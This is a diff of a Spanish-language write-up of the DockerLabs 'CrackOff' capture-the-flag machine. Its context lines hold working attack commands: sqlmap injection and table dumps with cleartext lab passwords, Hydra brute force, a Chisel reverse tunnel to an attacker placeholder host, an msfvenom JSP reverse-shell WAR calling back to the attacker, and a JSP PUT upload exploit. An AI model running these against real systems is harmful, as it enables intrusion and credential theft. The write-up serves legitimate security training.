@@ -134,16 +134,9 @@ Durante el reconocimiento, se identificó la posibilidad de acceso anónimo en s
 ### Gobuster
 Se enumero subdirectorios con la herramienta  **gobuster**
 ```bash
-┌──(kali㉿kali)-[~/Estudios/DockerLabs/crackoff/nmap]
-└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-===============================================================
-===============================================================
-[+] Url:                     http://172.17.0.2/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
 
-===============================================================
+└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+
 /db.php               (Status: 302) [Size: 75] [--> error.php]
 /error.php            (Status: 200) [Size: 2705]
 /index.php            (Status: 200) [Size: 2974]
@@ -186,12 +179,12 @@ sudo sqlmap -u 'http://172.17.0.2/login.php' -X POST --data 'username=test&passw
 sudo sqlmap -u 'http://172.17.0.2/login.php' -X POST --data "username=test*&password=' or 1=1-- -" --batch --dbs --level 5 --risk 3 --random-agent
 ```
 
-### ## 3.2. Exfiltración de Tablas (Dump)
+### 3.2. Exfiltración de Tablas (Dump)
 
 Se procedió a extraer el contenido de las tablas `users` y `passwords` de la base de datos `crackoff_db`.
 Una vez que se tiene el request se lanza el comando para capturar la base crackoff_db
 ```bash
-└─$ sqlmap -r request.txt --batch --dbs --risk=3 --level=5 --random-agent
+ sqlmap -r request.txt --batch --dbs --risk=3 --level=5 --random-agent
 
 web application technology: Apache 2.4.58
 back-end DBMS: MySQL >= 5.0.12
@@ -239,6 +232,7 @@ sqlmap -r request.txt --batch -D crackoff_db -T passwords -C name,id --dump
 | 12     | `badmenandwomen`            |                                                       |
 | 13     | superalicepassword          |                                                       |
 | 14     | flowerpower                 | ----> /var/www/alice_note/note.txt  acceso al keepass |
+
 ### Tabla: `users`
 
 Listado de identidades del sistema recuperadas de `crackoff_db`.
@@ -266,7 +260,7 @@ Tras la exfiltración de las tablas `users` y `passwords`, se procedió a realiz
     
 
 **Comando ejecutado:**
-```Bash
+```bash
 hydra -L users.txt -P credenciales.txt ssh://172.17.0.2 -t4 -f -V -Z
 ```
 
@@ -298,7 +292,7 @@ Se transfirió y ejecutó el script `linpeas.sh` para automatizar la búsqueda d
 
 **Comando ejecutado:**
 
-```Bash
+```bash
 # En la máquina atacante:
 python3 -m http.server 80
 
@@ -323,7 +317,7 @@ El reporte de LinPEAS detectó archivos sensibles accesibles por el usuario actu
 
 
 ```bash
-╔══════════╣ Useful software                                                                             
+Useful software                                                                             
 /usr/bin/base64                   
 /usr/bin/curl                    
 /usr/bin/g++                       
@@ -340,7 +334,7 @@ El reporte de LinPEAS detectó archivos sensibles accesibles por el usuario actu
 ![Ps Aux](/assets/images/posts/dockerlabs/cracoff/aux1.png)  
 
 ```bash
-╔══════════╣ Searching root files in home dirs (limit 30)                                                
+Searching root files in home dirs (limit 30)                                                
 /home/                             
 /root/                              
 /var/www                            
@@ -363,7 +357,7 @@ Tras la enumeración de procesos, se detectó que el servicio **Apache Tomcat** 
 Se procedió a descargar y preparar el binario de Chisel en la máquina atacante para su posterior transferencia al _host_ comprometido.
 
 **En la máquina Atacante (Kali):**
-```Bash
+```bash
 # Descarga y descompresión
 wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz
 gunzip chisel_1.11.3_linux_amd64.gz
@@ -375,7 +369,7 @@ python3 -m http.server 9001
 ```
 
 **En la máquina Víctima (CrackOff):**
-```Bash
+```bash
 # Descarga del binario
 wget http://<IP_KALI>:9001/chisel
 chmod +x chisel
@@ -394,13 +388,13 @@ Una vez transferido el binario, se estableció un túnel para exponer el servici
 
 **1. Máquina Atacante (Servidor):** Se pone Chisel a la escucha en el puerto 9001 esperando la conexión reversa.
 
-```Bash
+```bash
 ./chisel server -p 9001 --reverse
 ```
 
 **2. Máquina Víctima (Cliente):** Se conecta al servidor y redirige el puerto 8080 local hacia el puerto 8080 del atacante.
 
-```Bash
+```bash
 cd /tmp
 ./chisel client <IP_KALI>:9001 R:8080:127.0.0.1:8080
 ```
@@ -419,7 +413,7 @@ Aunque se contaba con un dump previo de SQLMap, se utilizó **Hydra** para confi
 
 **Comando ejecutado:**
 
-```Bash
+```bash
 hydra -l alice -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-get /manager/html
 ```
 ![Usuario Tomcat](/assets/images/posts/dockerlabs/cracoff/user1.png)  
@@ -440,7 +434,7 @@ Se utilizó `msfvenom` para generar un paquete de aplicación web malicioso que 
 
 **Comando de generación:**
 
-```Bash
+```bash
 sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=8888 -f war -o shell.war
 ```
 
@@ -468,7 +462,7 @@ Para verificar la vulnerabilidad, se intenta cargar un archivo JSP simple que ej
 
 **Comando de explotación:**
 
-```Bash
+```bash
 curl -X PUT http://127.0.0.1:8080/pwn.jsp/ --data '<% out.println("pwned"); %>'
 ```
 
@@ -532,7 +526,7 @@ Utilizando los privilegios de `manager-gui`, se desplegó un archivo de aplicaci
 #### Enumeración del Sistema de Archivos
 
 Se procedió a inspeccionar el directorio _home_ del usuario actual para buscar información sensible o vectores de movimiento lateral.
-```Bash
+```bash
 tomcat@408226713be3:/home$ ls -al ~
 total 180
 drwx------ 1 tomcat tomcat  4096 Aug 21  2024 .
@@ -555,7 +549,7 @@ su mario # Password: marioeseljefe
 
 Una vez en la sesión de Mario, se procedió a listar el directorio _home_ y capturar la flag de usuario.
 
-```Bash
+```bash
 ls -l ~
 cat user.txt
 ```
@@ -577,7 +571,7 @@ Se realizó la transferencia del archivo `.kdbx` a la máquina atacante para su 
 ### Acceso al usuario Alice. 
 Se obtuvo acceso mediante SSH utilizando credenciales previamente identificadas.
 
-```Bash
+```bash
 ssh alice@172.17.0.2
 # Password: superalicepassword
 ```
@@ -596,7 +590,7 @@ ps aux | grep -i alice
 El archivo `/opt/alice/boss` presentaba una configuración de permisos excesivamente permisiva (`777`), lo que permite a cualquier usuario modificar un script que, por su función, es ejecutado por procesos de mayor privilegio.
 
 **Contenido original del script:**
-```Bash
+```bash
 alice@408226713be3:/opt/alice$ cat boss 
 #!/bin/bash
 echo "Necesito los informes de la semana pasada ya Alice." > /home/alice/nota.txt
@@ -630,7 +624,7 @@ Tras obtener acceso inicial, se realizó una enumeración del sistema de archivo
 
 **Evidencia de permisos:**
 
-```Bash
+```bash
 # ls -la /opt/alice
 -rwxrwxrwx 1 root  root   136 Dec 19 14:31 boss
 ```
